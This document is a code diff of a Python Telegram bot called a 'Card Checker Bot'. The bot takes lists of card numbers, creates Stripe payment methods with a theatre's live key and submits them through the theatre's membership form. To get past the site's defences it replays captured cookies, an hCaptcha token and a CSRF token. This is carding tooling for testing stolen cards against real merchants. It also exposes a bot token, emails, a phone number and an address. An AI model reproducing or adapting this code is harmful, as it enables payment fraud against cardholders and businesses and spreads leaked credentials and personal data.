@@ -6,33 +6,40 @@ import time
 BOT_TOKEN = "7018443911:AAFP7YgMlc03URuqMUv-_VzysmewC0vt8jM"
 bot = telebot.TeleBot(BOT_TOKEN)
 
-SIGNUP_URL = "https://www.muaythaitechnician.com/signup/"
-STRIPE_CONFIRM_URL = "https://api.stripe.com/v1/setup_intents/{seti_id}/confirm"
-
-HEADERS_SIGNUP = {
-    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "accept-encoding": "gzip, deflate, br, zstd",
-    "accept-language": "en-US,en;q=0.9",
-    "cache-control": "max-age=0",
-    "cookie": "_fbp=fb.1.1746260299514.712237950499279748; mo_is_new=true; mo_has_visited=true; wordpress_test_cookie=WP%20Cookie%20check; mo_page_views_counter=8",
-    "priority": "u=0, i",
-    "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-    "sec-ch-ua-mobile": "?0",
-    "sec-ch-ua-platform": '"Windows"',
-    "sec-fetch-dest": "document",
-    "sec-fetch-mode": "navigate",
-    "sec-fetch-site": "cross-site",
-    "sec-fetch-user": "?1",
-    "upgrade-insecure-requests": "1",
-    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
-}
+STRIPE_PAYMENT_METHOD_URL = "https://api.stripe.com/v1/payment_methods"
+FINAL_FORM_URL = "https://chancetheater.com/wp/wp-admin/admin-ajax.php"
 
 HEADERS_STRIPE = {
     "content-type": "application/x-www-form-urlencoded",
     "accept": "application/json",
-    "origin": "https://js.stripe.com",
-    "referer": "https://js.stripe.com/",
+    "origin": "https://chancetheater.com",
+    "referer": "https://chancetheater.com/membership-form/",
     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
+}
+
+HEADERS_FINAL = {
+    "accept": "application/json, text/javascript, */*; q=0.01",
+    "accept-encoding": "gzip, deflate, br, zstd",
+    "accept-language": "en-US,en;q=0.9",
+    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryhR4xhAq7JgM4inLB",
+    "cookie": "PHPSESSID=217e7a4210465860036d3dc50c40d851; _gcl_au=1.1.598876553.1746261261; _fbp=fb.1.1746261260870.580309133473345222; gaVisitorUuid=770da14e-5d39-4b4d-a5a8-2b3070d3943d; _wpfuuid=a87f5cca-1ecf-45b8-825f-beeb941e666f; _gid=GA1.2.319886946.1746261261; optiMonkClientId=5f4cc74c-9cb8-6702-ec56-3dcf85e524d5; optiMonkSession=1746261261; csrf_token=ac0232a4-c0de-45b1-a9d3-4dd2d186ede0; __stripe_mid=c1df49a5-684a-4c57-a7f3-a02335f1a5f4a2ce12; __stripe_sid=7cc42dba-e56d-42c8-8cc5-c2836427049cad7f23; cf_clearance=4.mQWqdipfN9gr0C1UWvzf9gW6cenls5bZ55NF5fwUQ-1746261315-1.2.1.1-uEpJpJNq8V1fA_uR7gIKEjJ5ToAbH1amKZXuDw.6Pj6PNiliEcFrN8DFbYz3qZWOvLKFHK0w8y2qa.w0YBnq2.T89o67U0_YiW__HY15zvVmJVzJbO0I7qY2bs6G9X4f_I7QI8dAuamE4_cNU9IuK4FDgURwJRxDn2Z8FiiaS9ax3prK7YSk7xFX.c3Jr_PbNW5PS7Jj6ZDElo9FHyFaOccYAHLkVF.KHNDMk3NtErmH8g53352cl24Poe9RKo_USnXuNhwrJjYza_njjyWLK7EQudm5OUAO.fNrnbIIrVggF5.JaZe4UAUOYkiCO.5h7v2D9stt7VKCqHKsabsYSaom0Jj7jA4fw2tCtXAoIiv5ODx_e6XeewWy3fuxfHJA; cfzs_google-analytics_v4=%7B%22VGST_pageviewCounter%22%3A%7B%22v%22%3A%222%22%7D%7D; optiMonkClient=N4IgTAjBAMDsDMIBcoDGBDZwC+AaEAZgG7ISwAsAbGJRDRPgDYlJlX3wQAcAdNAKyx8AOwD2ABxZhs2IA===; _ga=GA1.2.2062418968.1746261260; cfz_google-analytics_v4=%7B%22VGST_engagementDuration%22%3A%7B%22v%22%3A%220%22%2C%22e%22%3A1777797392978%7D%2C%22VGST_engagementStart%22%3A%7B%22v%22%3A1746261393540%2C%22e%22%3A1777797393404%7D%2C%22VGST_counter%22%3A%7B%22v%22%3A%224%22%2C%22e%22%3A1777797392978%7D%2C%22VGST_ga4sid%22%3A%7B%22v%22%3A%22901381343%22%2C%22e%22%3A1746263192978%7D%2C%22VGST_session_counter%22%3A%7B%22v%22%3A%221%22%2C%22e%22%3A1777797392978%7D%2C%22VGST_ga4%22%3A%7B%22v%22%3A%229cd0c2b8-0e6d-477d-891f-24995d18106f%22%2C%22e%22%3A1777797392978%7D%2C%22VGST_let%22%3A%7B%22v%22%3A%221746261392978%22%2C%22e%22%3A1777797392978%7D%7D; _ga_6YT7YRHLXP=GS1.1.1746261260.1.1.1746261414.60.0.0",
+    "origin": "https://chancetheater.com",
+    "priority": "u=1, i",
+    "referer": "https://chancetheater.com/membership-form/",
+    "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+    "sec-ch-ua-arch": "x86",
+    "sec-ch-ua-bitness": "64",
+    "sec-ch-ua-full-version": "135.0.7049.116",
+    "sec-ch-ua-full-version-list": '"Google Chrome";v="135.0.7049.116", "Not-A.Brand";v="8.0.0.0", "Chromium";v="135.0.7049.116"',
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-model": "",
+    "sec-ch-ua-platform": '"Windows"',
+    "sec-ch-ua-platform-version": "19.0.0",
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-origin",
+    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
+    "x-requested-with": "XMLHttpRequest"
 }
 
 def parse_card(card_text):
@@ -46,68 +53,153 @@ def parse_card(card_text):
         yy = yy[2:]
     return cc, mm, yy, cvv
 
-def get_setup_intent_key():
+def get_payment_method(cc, mm, yy, cvv):
+    data = {
+        "type": "card",
+        "billing_details[name]": "John Doe",
+        "card[number]": cc,
+        "card[cvc]": cvv,
+        "card[exp_month]": mm,
+        "card[exp_year]": yy,
+        "guid": "df1cb213-3b8d-40b5-861d-b78e6fbb086a883b59",
+        "muid": "c1df49a5-684a-4c57-a7f3-a02335f1a5f4a2ce12",
+        "sid": "7cc42dba-e56d-42c8-8cc5-c2836427049cad7f23",
+        "pasted_fields": "number",
+        "payment_user_agent": "stripe.js/ca98f11090; stripe-js-v3/ca98f11090; card-element",
+        "referrer": "https://chancetheater.com",
+        "time_on_page": "98633",
+        "key": "pk_live_514e8gjGBnfOyn04LBHjyFsg7jcN0plUUQyAyk3WDFTWv1SZ9Ghm9Vlz4KEHTJsZwWpLSn4epFnQXQFCZV47r9Saj00Yk3G0rVO",
+        "radar_options[hcaptcha_token]": "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiaDhYM3JRcFJZdHpTd2Vsckk5YWdzNm5xZzlOQm55dEh0TXUzR2liVjYwZHUyRm1WcStBTlVNN1g4a2VEZ3g4a2NiTGJjOGRLOS9FR2FFeUxqa2hpV3pmdTc5akdMQ0RyZ2VRc2JTbEwyR05uSkhmQmFyUGpDaFM3OC9vdERjVTBXMXJsb21BdzM3dWxKNDltZkxpbjE3Rkl5Skt6V3JxRVN6dnlCdzU4Y2NMSmM5RnR6NTV3THArRUl1d0ZOWGNCK084L1JkeVdSdlNoL1BuQ1A0d0hoWEFlMHRQYlZKM0JwQmhwdVp3SWJUWm1ENDExTGg4NEV4YnJOOHkybkpka0wrVXdBMVd5bGlFVlpENCtKNkdoTllHbGxoK1FCekwwdi9td2hNdmE2VnFKL3o3OG9oZ0VLUDRIa2NwUkZXbU56M09ISnBsVlRIaU5tOXFmQklOTSt3dGUxSktkQS9ybkVWS0ZCNmVTKzlZeGFUMEYyWmpCMDN6bXBhclF4eHNrckFJTWl2YUZlWHM2MitVYnJ6ZlNWMGN4V01vYmdHWXFkaDZwQ1QxZk5hQVZBQ0xobmtkS1EyQW1oUE5JOXNSNmpTaGZ3OW10V1NHUE1nazdyZk5QdW9kdkNhK0FLbGNiejE1VHBja0s4NlhQdkFwdWZzWUxiRElCNjVKYkZ0VmNGZ09FcjBOMjQ0M2FxOEY3SFMwNktwNlNSVGRJMTNEQ1lDbFB6Y0ZsMzJJWG9wdzdPQ294WXZzTG5YWXNuNTN2NXFvbUNQOVNtZzFZR2dWMThJL2srTzRwbFl0R3pSVE4zTUhKQ0svRE9UV3VXVTlRc0lBditTQVlXOTNwMkdDQXUxUkhrYmdOTHdUekUrZ2pnZldKYit1M3NodEZiMHY0ZW1UYzFrbTczR1hFWFVhS1lHeHpIMUVOZC9veFcvTFluQ2c1djh1NGROVWRaSlVSYTZpb0dYZVprcDV0SjhRMGhSQ3NmVUFDZEpqN0VZeVVYcG5qKzlGeHVVTUJGYVNFZGRrdUhTK1pLYWpSbjR2VDdaRXdINzI3bkxBRTFWR0N3a3VrR3cvNjU0WmxNVGk4c00rOW84M3haK0NIbmFBMWc1b2xJU1N4dmJ3V2VPcDF1WmRXMnVwdWNxKzhQK1dHUXMvZW5tQm5jUTJOa1hlUUdpQlI4a2VlcG5TOGFSZFExOExzYXF3TU9XaUJOc28zSnJUWWM2MlJ0dmN3UUVQN1RDTjJUN1dMVUZ5dE84M3Y3ZXlrWjk4VGk3TmZBUU56ZzE5eUtYU0dvR0VrMjhXNWEveU42SlcrMk42KzRINEtDNEllMDVLdzVON2ZSYWVKUThQWWljcHd0aDFPa3RYcysrbTJYQjlpdEdWUm9GQWk1eWJrYmxHQ2VWRkJJVi9mZnB5SHdxNGNiaWZkS0k2a2Y3SUF6RFNBeGYrUGJTZEc2N1hpT0FUb0psWFVJRENYS3ZDTFJsUnluaTd5UjZlRW05QVphc2VDL0lOWnljYVEzSndCTXlONnFLTUVON1UvMHdxcmZQeTgwNkRoc0htOEQ5TEhMMmkxSUdHT2pENFhuN2RGNHRFdlE4WWZkWngvK1IrNjlFVEh0WXREWmxsajM5N1R0N0d0NUhPNkJKKzZaSjF5bDdEZGVpVWJIdXo5dEoxdG1sci93TDQ4bHc3Mk1zQ09DOVlGY2NWV2VJdnFDNzJpckpCVW5KOXZIVUZMdlZjbFdKZzUxKzFlaVRMQVZIc0I2Z2hIb2NTeVNtZDUwOTFNZlc5QVFuTjVGOWsybHNrUCt4VUMxa0N3SXlYdkJzTitmTXVGOUZwKzkzK1pDNGVLSXl4TnQwbnZ2WXF4WVdUSlFHT3ByQnY1ckVkaFVYUWs2T0tYS3EvSXhmYXViTFlqam1wNHdSOXZaZ0JnU2d4a1ZRMk9QZDg3VTVZYmo0clZQR05pNDhZeEF2OWNRU08rQzlPdHJRNndCSkF3RGlUSHpFdXQ4bm00V2czOUhRZ3RjTGY5Snl0RFFSL2c3aTJnTlJZb1p0NWFZMlBOckZxN1lacHJJZ25wM0dkdzU0QmxOQUVRYnZGdi9UYXdxaUZCVTZRbkJlcnZvY3I1Zy9lZ3VqWitmQmRKZkUrZWkyTTgxc2lMTW9pd2l3bngybFRqMExkcjVMNjlqeEU4VDhqZTIwM2UzeVhZUjRMc1U0ZWZUZ3JQYnp0aitZbnU5ZGtTWFNidUpSY3lYcUpKaU1BcHhsVUdlVGxVeHlvdGx5dHNvb2hnMXlSSDVkaHUzVnpuK1pmZHZrRjdtbjA3N0JLNGdXZGc1VmpUVG8yMFVVZDBEMmIyS1BVNzN5Z0U2Rmk4dGdnVXQ1YzRlYnQvNlQxQ1NiYUFPclFyVWJQWDdEZktlOXhQUjVoZ2lFWW9VRGpPNWUzdFNiOTlwVFdIRGxOT2xGTkJ2T3g2enZTcGNCd1g5ZU1tU1pTd1kvdEVuMjl6YU9tZmN1bCtIczcvaUlQNjFQT2xRZ3VBU0dzOGRVUFRmWUZVMEF4b1NLNTF5VExGWENCT0h3MEJjaXIvK1c0cm5DSTY0T3NSWFZDVE9TaDl1Z012VlFTUHBpN25FUEtEWG1neFI4VXkwMFlnZld4MjRIM1RSb2JUNWhoa3NHS2JFOTM1cUN3RlovMlRmVzVDRm1ScXBwT3V5cGN1dGRIa2daMUY2S2hUdXBEOTNhL0R1OUpNR3l1Zi90a3IvL0NldDl2YW1aMVBDZmNjVElsSnZOK1RHbVlEVUplNGNLajAxd0g2RmhlOWJLWlpJWUVBVTFLNzNzM2I2MmR6bjRoaW5mVVIzdFltTW1LOHlScVhqRzByRXk3cUkwZEdGc3lVS1F6eTB2RitITWYzWXZNRCt1TlNQT2VBd1FQUVJMQ1NvZjV2bmVDSHVUUHl4QT09IiwiZXhwIjoxNzQ2MjYxNDQwLCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiM2RkNGI3NSIsInBkIjowLCJjZGF0YSI6IlArTC95TE1DK0tMQnJXR0xTZzhNbndDWVVScnU1aDMvYitNMUlOS0NMNFptOE9FUWgzcW1ZQUlVeEJzb1FRTFFTLzk5TnZyc1pCL1JFVWpKb2VWeWlYcGl5VlZUbTQvWlpYRzU4Y0xBV21YRThKenRwRGdSSFhYRFBUTUd5UEdsa2p5dWVwdlcxNUsxYmtZWEtQc0czM2t5WWhkYmk3NFhPMHNpMkxRQ2tsWmlNdEEzSWtzRWJmUWhYZG5FbzlDL25PUms3OGVBYndKQk1FZVQifQ.gpV0pb6097q-X9X8JHnfKAczFUps3ioLlca0Z19jsPQ"
+    }
     try:
-        resp = requests.get(SIGNUP_URL, headers=HEADERS_SIGNUP, timeout=30)
+        resp = requests.post(STRIPE_PAYMENT_METHOD_URL, headers=HEADERS_STRIPE, data=data, timeout=30)
         resp.raise_for_status()
-        html = resp.text
-        # Extract seti_ value from HTML
-        found = re.findall(r"seti_[\w\d]+", html)
-        if found:
-            return found[-1]  # Return last found
-        else:
-            return None
+        json_resp = resp.json()
+        pm_id = json_resp.get("id")
+        return pm_id
     except Exception as e:
         return None
 
-def confirm_stripe(seti_id, cc, mm, yy, cvv):
-    url = STRIPE_CONFIRM_URL.format(seti_id=seti_id)
-    data = {
-        "payment_method_data[type]": "card",
-        "payment_method_data[billing_details][email]": "peshangsalam2002@gmail.com",
-        "payment_method_data[billing_details][name]": "Peshang Salam",
-        "payment_method_data[card][number]": cc,
-        "payment_method_data[card][cvc]": cvv,
-        "payment_method_data[card][exp_month]": mm,
-        "payment_method_data[card][exp_year]": yy,
-        "payment_method_data[guid]": "df1cb213-3b8d-40b5-861d-b78e6fbb086a883b59",
-        "payment_method_data[muid]": "3852b30c-2153-48ea-a84f-1a9d9de755b4779625",
-        "payment_method_data[sid]": "ab9c9b1c-e6f7-4ef4-8cda-f54418bc7172a64f6d",
-        "payment_method_data[pasted_fields]": "number",
-        "payment_method_data[payment_user_agent]": "stripe.js/ca98f11090; stripe-js-v3/ca98f11090; card-element",
-        "payment_method_data[referrer]": "https://www.muaythaitechnician.com",
-        "payment_method_data[time_on_page]": "56557",
-        "expected_payment_method_type": "card",
-        "radar_options[hcaptcha_token]": "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoicUdSazJ3cFVUN3RPUFJySGVQR2dMdS9OMEJoZ0Znb2tQK0ljU1hadU5ZOS9VMG9uaG5DYzNONzFYT091QzEvWVBPZFBQTDN4Qzh3d3FHdnJGbG0vNXV4ZzZsZ004YmhwaUdTcmZTMitiNkJaYnlDSnlBMnlhU0REMUtpZG4xbFhkRTZOKzdrdmZERTFoUHQybU1LSVNKRFBJaW9UTi9BSWpnVjNtOWk5N2VqYW1UVnFmblRwOUovaklUWHlweXV0YUwxWUdLNERqK1l3dHoxUi9uQitLU09QdXhGOW5jMVJhUXMwWFg3NmlnUmw1M2wxOVZBSmI2Mk5RaXM4SlpJdldjOWgzU2xlRDdYWDBZWGdLNEltNVRJUE1laUdUWm9IRW50YzV1UHRIUHJCeXZuaFpROVNpR0NMTU8zV2o5cnFLUmZJVFFCZkNEZm4yTnBLK0lMMTdJWCtUS1hjNFNyUzVZOU1wa3RBZXdLek5ja2JnL0hzMCtKMVpMRDB0QjJDU0ZSRnF0TG9xMGlzalI1T0svbUJFc25MMldMRGoyV2RGT3lBWGtDRkw2Z2VoRldJRDJrVVpaVUhuWGdISUgxbGg3SnRqRG1WTmlhVmgrOTRjMHpzSjA1dVNCWEFRMFI0NHB5L01ZSlFYUG5CaGZrekwzdUVKS0lOMGU0ZmZFMnZXa2oxSlJZOEZyT1FaYnQvWjZ1SkRUQ25ReXRGbkRWTFd5bk5mbGNYQjcySml5Z1Z4OXhZV1lFOUIzRXdaU2RlVXU5Mnp1UytjOXA0V292L1JmblR0WUFTSXlaUi92Y0RwMmZiemQzV2xGSGMrRjZqcDlyc3haSVllRjIydURJZnNibDltVFdjdTB3bEJUZDBaQ2swa3p0WjhhTHhNS3B1RWNPbTExVWFYbk5ZODBXQlZpRWpiSXEzelkxY2tLaDRnemVidWkyS1FrdlZzZWwxc2ZYcnlKRjJFQzUzUVRIc1lJRmFnaGxZTGl1aUFPb2ZEY3RvTzFPTmdrMDBwZ2NaZ3YrdDQwcXFYQlpobFpTOVV3b2RUVlVrMDhzVzVybUdscEhkcW1ncXFYa3pJVGppNDRWR0lkUENPdHNvazVSaUYyZlR4b2ZBNE1ybWVhY0ZZaHZwTHFxWFpxQWRQVVNxYWZtTnNJaVE0eWhiZWNkY3lrWi9TdFplaG1tWC8vUm9PcmpEQzBkdjFhS3dSY0Joaktud1l4Tnh5TFlRb3M0K0U5WERaNFI3MERTeUdPUVBoanpFLy91YnIxSEJZUWdnbFBFOXJzcHI3REgzWXBIR1NQWmlIZ0I1WGVSUURSVmVROE82SSsydjE1ZHNMYWJzNllGVGEvaFNVTGpkVG9mUytiYk5GTkFBQys1TDNiNzBCS3hhT0dhUlYxZDNPNXRTNmZYT0oxNWJxZjFVN1paR3ZKMmdxVHFZQ2lrM1JoRndidFYwVWpwSlB3SlpZQkwwZWxMZXNVaXZPa04xVWptSVBwc2I0ZnBma24zd0hjVE83YmNwWGJhZmlZUkJtTDh4VkQwdkJtT08wUFZDbVpzYTcwUmxZZUpaZTFCdUp0dElzY0FkZkNQRDdaVDdLVVQvK29mTStBRnVKRHluVjYxWE41c2VWUHJUZnhwTElMMTU1UE4xMDVVNHpwYjV6WWRicWZQRTJsZE5CVDNacjFNam14NnBTaDZ4RnMrSUwzeFhtNFNEQnpuN3E5VEg3aFA5UkNTYXAvMzY4TG5kd1o2RWg5TVVCSjNXWGVUWDFpb21waWl2bmE0b1kzZlQyK1NvZGcwR003SjlEdTlnYlJ3WnJFUEhwZW9oOW5CdXh5Zmhmd2hwckppYk80UDh5RkZnVlNLMnJ4anFGQVMxMUd4NXBpdkRsRVltUGlITG5iYnRjQWt1MTgraW9OM1M2elVRN1VQeExrbm0rdWZCaUlFc1NNcVNyY2NGQ1pLTVhEZlQ2L05PZFYxZ1ZMck1EcUFCN0RxeFk0SlN3S0Y4V2dKZTloZUU5NlBPakdlMkJnZXJJYUJ0WVJ6YmtUcy9KeFlFdjNoYnlOSmpWR3UvVzBQM3NzR3ZQSmlHbjBROTlLSW43RXZlc1NKeG40ZWpNV0dGM2ZVNURMUitIYlhJS2FUZEszNTRmek1QNjVHZllXeGlpcm5WY3RJeUc0RUFFUUhvb24xTFU3RjAxYXRMUmJLZEhGRXZBUzFpcW1ReHFValF5cDlrOUpoMDNUdU1YMGladW43eW9vK0YzaDVoSzAxQmZBZFlQR1VlYzJJblMvRTZGNDR2SWRhRkwzVlIvOTZkbXNOR3VWQWFlcDFWM2ZwQUNBd2xOc0d4OWdpQXdiM0YzRkFNaDhTa1hSaCtTNEhObHpYQ0JoNFBqUzN0aGtsTHJnWUdKWGRtam9aRmhpVUpzQmFnNUNwNm1SdXVrVE8ybUNPTVdIZTR1SW5hWExvazJQRWxLTjlWUEVTd1k0eUhhMy9ST3JKd0JNWVAzNHhKdHcvMUxZcHEzd2NCaCs5WlNpODJ2bGQ1NkxpVEd0RGJLempkbVpwZm51RjVsUnpJRTVOVDNHRVdkczh1dmJjQkNoOHdtQVZsZlU4dlBVb0VXMTZzNWczN1N4T2p5bXVzLzNwaFc0R0RsN2dkRmNuaDZzdXJnMERkWEYyOTZZSWt5c2MxWUU0RktybVB6SnNCUmwyTStNVENURmhNaVRqT0ZIc0xrNzl0QjI1YXJKRUJkQmxTN0NROEtwRGFlUlYwSFM0NmlTTlQwZVNNVTVTWElmeTFTamNtWXdCTEZyQVdrR2ZqN1R4RUJSSmJBdS9FVnJBczRMYUplVk5lNVdIaGR1azROM2ZEaXY4cHhkMGZPOTB5WWZNZUdWOHlPUUpjR25SNWd2dVJZdUtlMWhraWw3aXJSL0l4NWtiQzl1cFprUlRMNTZWZStZeWs4NE94IiwiZXhwIjoxNzQ2MjYwNTMwLCJzaGFyZF9pZCI6NTM1NzY1NTksImtyIjoiMjY5ZjgwYiIsInBkIjowLCJjZGF0YSI6InpRaTd2ekhpNTBGMlFyS1JoMmQ4bVZOdFNPM3VOYTJPaTlmNG9LUmRnOUhKeklBVkIwN2kyNmpHY2ZBRkFhTFRHSXF6TGZrYnBHaE80b2M0K09USTB5b3JYUGs1aloxRXJXc1R5TTVpV3lpV3RWc0FPNzRJcTl5bFQvTEdZRCtRRTVTUDdSb2IxMTc0N21IN01raC85VVpISHEwa25hWW45Y2ZKUWZBSm9OZUQ5RER1VUFLQ2tETURoK2dOWm9hVDhyUU92Y1V4NnUwTHRTNnAifQ.yiIwW4i9vDHt1u7pKyNnRzpgQMrjwyxZVhv7IW1dOjQ"
-    }
-    try:
-        resp = requests.post(url, headers=HEADERS_STRIPE, data=data, timeout=30)
-        result = resp.json()
-        status = result.get("status", "")
-        error = result.get("error", {})
-        message = error.get("message", "")
-        code = error.get("code", "")
-        decline_code = error.get("decline_code", "")
-        country = result.get("payment_method", {}).get("card", {}).get("country", "N/A")
-        return (
-            f"Status: {status}\n"
-            f"Country: {country}\n"
-            f"Code: {code}\n"
-            f"Decline Code: {decline_code}\n"
-            f"Message: {message}"
-        )
-    except Exception as e:
-        return f"❌ Error: {str(e)}"
+def build_final_form_data(pm_id):
+    # This is your fixed form data, just replacing pm_ value
+    return (
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][1][first]\"\r\n\r\n"
+        "John\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][1][last]\"\r\n\r\n"
+        "Doe\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][2]\"\r\n\r\n"
+        "peshangsalam2001@gmail.com\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][25]\"\r\n\r\n"
+        "+13144740104\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][15]\"\r\n\r\n"
+        "No, this will include me\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][31]\"\r\n\r\n"
+        "Single\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][30]\"\r\n\r\n"
+        "1\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][18][first]\"\r\n\r\n"
+        "\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][18][last]\"\r\n\r\n"
+        "\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][19]\"\r\n\r\n"
+        "\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][26]\"\r\n\r\n"
+        "\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][20][first]\"\r\n\r\n"
+        "\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][20][last]\"\r\n\r\n"
+        "\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][22]\"\r\n\r\n"
+        "\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][27]\"\r\n\r\n"
+        "\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][24]\"\r\n\r\n"
+        "\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][28][]\"\r\n\r\n"
+        "By checking this box, I acknowledge that Chance Membership is a 12-month commitment and will auto-renew until canceled. Canceling during the first 12 months will result in a fee of $80 per member or the remainder of the membership, whichever is less.\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][14][address1]\"\r\n\r\n"
+        "198 White Horse Pike\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][14][address2]\"\r\n\r\n"
+        "\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][14][city]\"\r\n\r\n"
+        "Collingswood\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][14][state]\"\r\n\r\n"
+        "NJ\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][14][postal]\"\r\n\r\n"
+        "08107\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[stripe-credit-card-cardname]\"\r\n\r\n"
+        "John Doe\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[fields][4]\"\r\n\r\n"
+        "\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[id]\"\r\n\r\n"
+        "53498\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[author]\"\r\n\r\n"
+        "3\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[post_id]\"\r\n\r\n"
+        "13557\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[payment_method_id]\"\r\n\r\n"
+        f"{pm_id}\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"wpforms[token]\"\r\n\r\n"
+        "9b2a3af24f6c494ad14926c41d5aa2fc\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
+        "wpforms_submit\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"page_url\"\r\n\r\n"
+        "https://chancetheater.com/membership-form/\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"page_title\"\r\n\r\n"
+        "Subscribe with one of our monthly memberships!\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"page_id\"\r\n\r\n"
+        "13557\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"start_timestamp\"\r\n\r\n"
+        "1746261318347\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB\r\n"
+        "Content-Disposition: form-data; name=\"end_timestamp\"\r\n\r\n"
+        "1746261417521\r\n"
+        "------WebKitFormBoundaryhR4xhAq7JgM4inLB--\r\n"
+    )
 
 @bot.message_handler(commands=['start'])
 def start_handler(message):
     bot.send_message(message.chat.id,
-        "💳 MuayThaiTechnician Card Checker Bot\n"
+        "💳 ChanceTheater Card Checker Bot\n"
         "Send cards in format:\n"
         "CC|MM|YY|CVV or CC|MM|YYYY|CVV\n"
         "One per line.\n"
         "Example:\n"
-        "5170414899790881|03|27|704\n"
+        "4490520007396134|01|26|745\n"
         "4242424242424242|12|25|123"
     )
 
@@ -121,13 +213,18 @@ def card_handler(message):
             continue
         cc, mm, yy, cvv = parsed
 
-        seti_id = get_seti_id()
-        if not seti_id:
-            bot.send_message(message.chat.id, "❌ Failed to extract seti_... value from signup page.")
+        pm_id = get_payment_method(cc, mm, yy, cvv)
+        if not pm_id:
+            bot.send_message(message.chat.id, f"❌ Failed to create payment method for card: {cc}|{mm}|{yy}|{cvv}")
